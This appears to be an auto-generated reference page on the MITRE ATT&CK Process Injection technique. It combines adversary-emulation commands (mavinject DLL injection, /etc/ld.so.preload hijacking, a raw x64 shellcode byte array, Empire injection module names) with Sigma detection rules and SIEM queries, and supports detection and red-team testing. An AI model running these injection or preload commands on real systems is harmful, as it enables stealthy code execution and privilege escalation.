
# Process Injection

## Description

### MITRE Description

> Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. 

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. 

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. 

## Aliases

```

```

## Additional Attributes

* Bypass: ['Application control', 'Anti-virus']
* Effective Permissions: None
* Network: None
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1055

## Potential Commands

```
$mypid = (Start-Process notepad -PassThru).id
mavinject $mypid /INJECTRUNNING #{dll_payload}
$mypid = #{process_id}
mavinject $mypid /INJECTRUNNING PathToAtomicsFolder\T1055\src\x64\T1055.dll
0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
powershell/code_execution/invoke_reflectivepeinjection
powershell/code_execution/invoke_shellcode
powershell/code_execution/invoke_shellcodemsil
powershell/credentials/credential_injection
powershell/management/psinject
powershell/management/reflective_inject
powershell/management/shinject
python/management/osx/shellcodeinject64
```
echo #{path_to_shared_library} > /etc/ld.so.preload
echo /home/$USER/random.so > /etc/ld.so.preload
```

## Commands Dataset

```
[{'command': '$mypid = (Start-Process notepad -PassThru).id\n'
             'mavinject $mypid /INJECTRUNNING #{dll_payload}\n',
  'name': None,
  'source': 'atomics/T1055/T1055.yaml'},
 {'command': '$mypid = #{process_id}\n'
             'mavinject $mypid /INJECTRUNNING '
             'PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll\n',
  'name': None,
  'source': 'atomics/T1055/T1055.yaml'},
 {'command': '0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, '
             '0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, '
             '0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, '
             '0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, '
             '0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, '
             '0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, '
             '0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, '
             '0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, '
             '0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, '
             '0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, '
             '0x5B, 0x5A, 0x59, 0x58, 0xC3',
  'name': 'Start a new calculator process',
  'source': 'data/abilities/defense-evasion/a42dfc86-12f0-4f06-b0cf-24830c7f61f4.yml'},
 {'command': 'powershell/code_execution/invoke_reflectivepeinjection',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/code_execution/invoke_reflectivepeinjection',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/code_execution/invoke_shellcode',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/code_execution/invoke_shellcode',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/code_execution/invoke_shellcodemsil',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/code_execution/invoke_shellcodemsil',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/credential_injection',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/credential_injection',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/psinject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/psinject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/reflective_inject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/reflective_inject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/shinject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/shinject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/osx/shellcodeinject64',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/osx/shellcodeinject64',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': '```', 'name': None, 'source': 'Kirtar22/Litmus_Test'},
 {'command': 'echo #{path_to_shared_library} > /etc/ld.so.preload',
  'name': None,
  'source': 'Kirtar22/Litmus_Test'},
 {'command': '```', 'name': None, 'source': 'Kirtar22/Litmus_Test'},
 {'command': '```', 'name': None, 'source': 'Kirtar22/Litmus_Test'},
 {'command': 'echo /home/$USER/random.so > /etc/ld.so.preload',
  'name': None,
  'source': 'Kirtar22/Litmus_Test'},
 {'command': '```', 'name': None, 'source': 'Kirtar22/Litmus_Test'}]
```

## Potential Detections

```json
[{'data_source': 'auditlogs (audit.rules)'},
 {'data_source': 'bash_history logs'},
 {'data_source': {'author': 'Olaf Hartong, Florian Roth, Aleksey Potapov, '
                            'oscd.community',
                  'date': '2018/11/30',
                  'description': 'Detects a possible remote threat creation '
                                 'with certain characteristics which are '
                                 'typical for Cobalt Strike beacons',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 8,
                                              'TargetProcessAddress|endswith': ['0B80',
                                                                                '0C7C',
                                                                                '0C88']}},
                  'falsepositives': ['unknown'],
                  'id': '6309645e-122d-4c5b-bb2b-22e4f9c2fa42',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'modified': '2019/11/08',
                  'references': ['https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f',
                                 'https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion', 'attack.t1055'],
                  'title': 'CobaltStrike Process Injection'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2017/11/06',
                  'description': 'Detects the creation of a named pipe used by '
                                 'known APT malware',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': [17, 18],
                                              'PipeName': ['\\isapi_http',
                                                           '\\isapi_dg',
                                                           '\\isapi_dg2',
                                                           '\\sdlrpc',
                                                           '\\ahexec',
                                                           '\\winsession',
                                                           '\\lsassw',
                                                           '\\46a676ab7f179e511e30dd2dc41bd388',
                                                           '\\9f81f59bc58452127884ce513865ed20',
                                                           '\\e710f28d59aa529d6792ca6ff0ca1b34',
                                                           '\\rpchlp_3',
                                                           '\\NamePipe_MoreWindows',
                                                           '\\pcheap_reuse',
                                                           '\\msagent_*']}},
                  'falsepositives': ['Unkown'],
                  'id': 'fe3ac066-98bb-432a-b1e7-a5229cb39d4a',
                  'level': 'critical',
                  'logsource': {'definition': 'Note that you have to configure '
                                              'logging for PipeEvents in '
                                              'Symson config',
                                'product': 'windows',
                                'service': 'sysmon'},
                  'references': ['Various sources'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.privilege_escalation',
                           'attack.t1055'],
                  'title': 'Malicious Named Pipe'}},
 {'data_source': {'author': 'John Lambert (tech), Florian Roth (rule)',
                  'date': '2017/03/04',
                  'description': 'Detects a process access to verclsid.exe '
                                 'that injects shellcode from a Microsoft '
                                 'Office application / VBA macro',
                  'detection': {'combination1': {'CallTrace': '*|UNKNOWN(*VBE7.DLL*'},
                                'combination2': {'CallTrace': '*|UNKNOWN*',
                                                 'SourceImage': '*\\Microsoft '
                                                                'Office\\\\*'},
                                'condition': 'selection and 1 of combination*',
                                'selection': {'EventID': 10,
                                              'GrantedAccess': '0x1FFFFF',
                                              'TargetImage': '*\\verclsid.exe'}},
                  'falsepositives': ['unknown'],
                  'id': 'b7967e22-3d7e-409b-9ed5-cdae3f9243a1',
                  'level': 'high',
                  'logsource': {'definition': 'Use the following config to '
                                              'generate the necessary Event ID '
                                              '10 Process Access events: '
                                              '<ProcessAccess '
                                              'onmatch="include"><CallTrace '
                                              'condition="contains">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess '
                                              'onmatch="exclude"><CallTrace '
                                              'condition="excludes">UNKNOWN</CallTrace></ProcessAccess>',
                                'product': 'windows',
                                'service': 'sysmon'},
                  'references': ['https://twitter.com/JohnLaTwC/status/837743453039534080'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.privilege_escalation',
                           'attack.t1055'],
                  'title': 'Malware Shellcode in Verclsid Target Process'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/02/22',
                  'description': 'Detects Winword starting uncommon sub '
                                 'process FLTLDR.exe as used in exploits for '
                                 'CVE-2017-0261 and CVE-2017-0262',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': '*\\FLTLDR.exe*',
                                              'ParentImage': '*\\WINWORD.EXE'}},
                  'falsepositives': ['Several false positives identified, '
                                     'check for suspicious file names or '
                                     'locations (e.g. Temp folders)'],
                  'id': '864403a1-36c9-40a2-a982-4c9a45f7d833',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.privilege_escalation',
                           'attack.t1055'],
                  'title': 'Exploit for CVE-2017-0261'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/11/15',
                  'description': 'Detects exploitation attempt of privilege '
                                 'escalation vulnerability via '
                                 'SetupComplete.cmd and '
                                 'PartnerSetupComplete.cmd decribed in '
                                 'CVE-2019-1378',
                  'detection': {'condition': 'selection and not filter',
                                'filter': {'Image': ['C:\\Windows\\System32\\\\*',
                                                     'C:\\Windows\\SysWOW64\\\\*',
                                                     'C:\\Windows\\WinSxS\\\\*',
                                                     'C:\\Windows\\Setup\\\\*']},
                                'selection': {'ParentCommandLine': ['*\\cmd.exe '
                                                                    '/c '
                                                                    'C:\\Windows\\Setup\\Scripts\\SetupComplete.cmd',
                                                                    '*\\cmd.exe '
                                                                    '/c '
                                                                    'C:\\Windows\\Setup\\Scripts\\PartnerSetupComplete.cmd']}},
                  'falsepositives': ['Unknown'],
                  'id': '1c373b6d-76ce-4553-997d-8c1da9a6b5f5',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.embercybersecurity.com/blog/cve-2019-1378-exploiting-an-access-control-privilege-escalation-vulnerability-in-windows-10-update-assistant-wua'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.privilege_escalation',
                           'attack.t1055'],
                  'title': 'Exploiting SetupComplete.cmd CVE-2019-1378'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/01/10',
                  'description': 'Detects typical Dridex process patterns',
                  'detection': {'condition': '1 of them',
                                'selection1': {'CommandLine': '*\\svchost.exe '
                                                              'C:\\Users\\\\*\\Desktop\\\\*'},
                                'selection2': {'CommandLine': ['*whoami.exe '
                                                               '/all',
                                                               '*net.exe view'],
                                               'ParentImage': '*\\svchost.exe*'}},
                  'falsepositives': ['Unlikely'],
                  'id': 'e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://app.any.run/tasks/993daa5e-112a-4ff6-8b5a-edbcec7c7ba3'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.privilege_escalation',
                           'attack.t1055'],
                  'title': 'Dridex Process Pattern'}},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['DLL monitoring']},
 {'data_source': ['Named Pipes']},
 {'data_source': ['API monitoring']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Sysmon ID 7', 'DLL monitoring']},
 {'data_source': ['Sysmon ID 17', ' 18', 'Named Pipes']},
 {'data_source': ['API monitoring']}]
```

## Potential Queries

```json
[{'name': 'Process Injection Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and process_command_line contains '
           '"*Invoke-DllInjection*"or process_command_line contains '
           '"C:\\\\windows\\\\sysnative\\\\"'},
 {'name': None, 'product': 'Splunk', 'query': '```'},
 {'name': None,
  'product': 'Splunk',
  'query': 'index=linux sourcetype=linux_audit preload_lib'},
 {'name': None, 'product': 'Splunk', 'query': '```'},
 {'name': None, 'product': 'Splunk', 'query': '```'},
 {'name': None,
  'product': 'Splunk',
  'query': '-w /etc/ld.so.preload -p wa -k preload_lib'},
 {'name': None, 'product': 'Splunk', 'query': '```'},
 {'name': None, 'product': 'Splunk', 'query': '```'},
 {'name': None,
  'product': 'Splunk',
  'query': 'index=linux sourcetype="bash_history" ld.so.preload | table '
           'host,user_name,bash_command'},
 {'name': None, 'product': 'Splunk', 'query': '```'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Process Injection': {'atomic_tests': [{'auto_generated_guid': '74496461-11a1-4982-b439-4d87a550d254',
                                                                 'dependencies': [{'description': 'Utility '
                                                                                                  'to '
                                                                                                  'inject '
                                                                                                  'must '
                                                                                                  'exist '
                                                                                                  'on '
                                                                                                  'disk '
                                                                                                  'at '
                                                                                                  'specified '
                                                                                                  'location '
                                                                                                  '(#{dll_payload})\n',
                                                                                   'get_prereq_command': 'New-Item '
                                                                                                         '-Type '
                                                                                                         'Directory '
                                                                                                         '(split-path '
                                                                                                         '#{dll_payload}) '
                                                                                                         '-ErrorAction '
                                                                                                         'ignore '
                                                                                                         '| '
                                                                                                         'Out-Null\n'
                                                                                                         'Invoke-WebRequest '
                                                                                                         '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" '
                                                                                                         '-OutFile '
                                                                                                         '"#{dll_payload}"\n',
                                                                                   'prereq_command': 'if '
                                                                                                     '(Test-Path '
                                                                                                     '#{dll_payload}) '
                                                                                                     '{exit '
                                                                                                     '0} '
                                                                                                     'else '
                                                                                                     '{exit '
                                                                                                     '1}\n'}],
                                                                 'dependency_executor_name': 'powershell',
                                                                 'description': 'Windows '
                                                                                '10 '
                                                                                'Utility '
                                                                                'To '
                                                                                'Inject '
                                                                                'DLLS.\n'
                                                                                '\n'
                                                                                'Upon '
                                                                                'successful '
                                                                                'execution, '
                                                                                'powershell.exe '
                                                                                'will '
                                                                                'download '
                                                                                'T1055.dll '
                                                                                'to '
                                                                                'disk. '
                                                                                'Powershell '
                                                                                'will '
                                                                                'then '
                                                                                'spawn '
                                                                                'mavinject.exe '
                                                                                'to '
                                                                                'perform '
                                                                                'process '
                                                                                'injection '
                                                                                'in '
                                                                                'T1055.dll.\n'
                                                                                'With '
                                                                                'default '
                                                                                'arguments, '
                                                                                'expect '
                                                                                'to '
                                                                                'see '
                                                                                'a '
                                                                                'MessageBox, '
                                                                                'with '
                                                                                "notepad's "
                                                                                'icon '
                                                                                'in '
                                                                                'taskbar.\n',
                                                                 'executor': {'command': '$mypid '
                                                                                         '= '
                                                                                         '#{process_id}\n'
                                                                                         'mavinject '
                                                                                         '$mypid '
                                                                                         '/INJECTRUNNING '
                                                                                         '#{dll_payload}\n',
                                                                              'elevation_required': True,
                                                                              'name': 'powershell'},
                                                                 'input_arguments': {'dll_payload': {'default': 'PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll',
                                                                                                     'description': 'DLL '
                                                                                                                    'to '
                                                                                                                    'Inject',
                                                                                                     'type': 'Path'},
                                                                                     'process_id': {'default': '(Start-Process '
                                                                                                               'notepad '
                                                                                                               '-PassThru).id',
                                                                                                    'description': 'PID '
                                                                                                                   'of '
                                                                                                                   'input_arguments',
                                                                                                    'type': 'Integer'}},
                                                                 'name': 'Process '
                                                                         'Injection '
                                                                         'via '
                                                                         'mavinject.exe',
                                                                 'supported_platforms': ['windows']}],
                                               'attack_technique': 'T1055',
                                               'display_name': 'Process '
                                                               'Injection'}},
 {'Mitre Stockpile - Start a new calculator process': {'description': 'Start a '
                                                                      'new '
                                                                      'calculator '
                                                                      'process',
                                                       'id': 'a42dfc86-12f0-4f06-b0cf-24830c7f61f4',
                                                       'name': 'Spawn '
                                                               'calculator '
                                                               '(shellcode)',
                                                       'platforms': {'windows': {'shellcode_amd64': {'command': '0x50, '
                                                                                                                '0x51, '
                                                                                                                '0x52, '
                                                                                                                '0x53, '
                                                                                                                '0x56, '
                                                                                                                '0x57, '
                                                                                                                '0x55, '
                                                                                                                '0x6A, '
                                                                                                                '0x60, '
                                                                                                                '0x5A, '
                                                                                                                '0x68, '
                                                                                                                '0x63, '
                                                                                                                '0x61, '
                                                                                                                '0x6C, '
                                                                                                                '0x63, '
                                                                                                                '0x54, '
                                                                                                                '0x59, '
                                                                                                                '0x48, '
                                                                                                                '0x83, '
                                                                                                                '0xEC, '
                                                                                                                '0x28, '
                                                                                                                '0x65, '
                                                                                                                '0x48, '
                                                                                                                '0x8B, '
                                                                                                                '0x32, '
                                                                                                                '0x48, '
                                                                                                                '0x8B, '
                                                                                                                '0x76, '
                                                                                                                '0x18, '
                                                                                                                '0x48, '
                                                                                                                '0x8B, '
                                                                                                                '0x76, '
                                                                                                                '0x10, '
                                                                                                                '0x48, '
                                                                                                                '0xAD, '
                                                                                                                '0x48, '
                                                                                                                '0x8B, '
                                                                                                                '0x30, '
                                                                                                                '0x48, '
                                                                                                                '0x8B, '
                                                                                                                '0x7E, '
                                                                                                                '0x30, '
                                                                                                                '0x03, '
                                                                                                                '0x57, '
                                                                                                                '0x3C, '
                                                                                                                '0x8B, '
                                                                                                                '0x5C, '
                                                                                                                '0x17, '
                                                                                                                '0x28, '
                                                                                                                '0x8B, '
                                                                                                                '0x74, '
                                                                                                                '0x1F, '
                                                                                                                '0x20, '
                                                                                                                '0x48, '
                                                                                                                '0x01, '
                                                                                                                '0xFE, '
                                                                                                                '0x8B, '
                                                                                                                '0x54, '
                                                                                                                '0x1F, '
                                                                                                                '0x24, '
                                                                                                                '0x0F, '
                                                                                                                '0xB7, '
                                                                                                                '0x2C, '
                                                                                                                '0x17, '
                                                                                                                '0x8D, '
                                                                                                                '0x52, '
                                                                                                                '0x02, '
                                                                                                                '0xAD, '
                                                                                                                '0x81, '
                                                                                                                '0x3C, '
                                                                                                                '0x07, '
                                                                                                                '0x57, '
                                                                                                                '0x69, '
                                                                                                                '0x6E, '
                                                                                                                '0x45, '
                                                                                                                '0x75, '
                                                                                                                '0xEF, '
                                                                                                                '0x8B, '
                                                                                                                '0x74, '
                                                                                                                '0x1F, '
                                                                                                                '0x1C, '
                                                                                                                '0x48, '
                                                                                                                '0x01, '
                                                                                                                '0xFE, '
                                                                                                                '0x8B, '
                                                                                                                '0x34, '
                                                                                                                '0xAE, '
                                                                                                                '0x48, '
                                                                                                                '0x01, '
                                                                                                                '0xF7, '
                                                                                                                '0x99, '
                                                                                                                '0xFF, '
                                                                                                                '0xD7, '
                                                                                                                '0x48, '
                                                                                                                '0x83, '
                                                                                                                '0xC4, '
                                                                                                                '0x30, '
                                                                                                                '0x5D, '
                                                                                                                '0x5F, '
                                                                                                                '0x5E, '
                                                                                                                '0x5B, '
                                                                                                                '0x5A, '
                                                                                                                '0x59, '
                                                                                                                '0x58, '
                                                                                                                '0xC3'}}},
                                                       'tactic': 'defense-evasion',
                                                       'technique': {'attack_id': 'T1055',
                                                                     'name': 'Process '
                                                                             'Injection'}}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/code_execution/invoke_reflectivepeinjection":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/code_execution/invoke_reflectivepeinjection',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/code_execution/invoke_shellcode":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/code_execution/invoke_shellcode',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/code_execution/invoke_shellcodemsil":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/code_execution/invoke_shellcodemsil',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/credential_injection":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/credentials/credential_injection',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/psinject":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/management/psinject',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/reflective_inject":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/management/reflective_inject',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/shinject":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'powershell/management/shinject',
                                            'Technique': 'Process Injection'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1055',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/management/osx/shellcodeinject64":  '
                                                                                 '["T1055"],',
                                            'Empire Module': 'python/management/osx/shellcodeinject64',
                                            'Technique': 'Process Injection'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations


* [Behavior Prevention on Endpoint](../mitigations/Behavior-Prevention-on-Endpoint.md)

* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    

# Actors


* [Turla](../actors/Turla.md)

* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [APT37](../actors/APT37.md)
    
* [PLATINUM](../actors/PLATINUM.md)
    
* [Honeybee](../actors/Honeybee.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [APT41](../actors/APT41.md)
    
* [Silence](../actors/Silence.md)
    
* [Sharpshooter](../actors/Sharpshooter.md)
    
* [APT32](../actors/APT32.md)
    
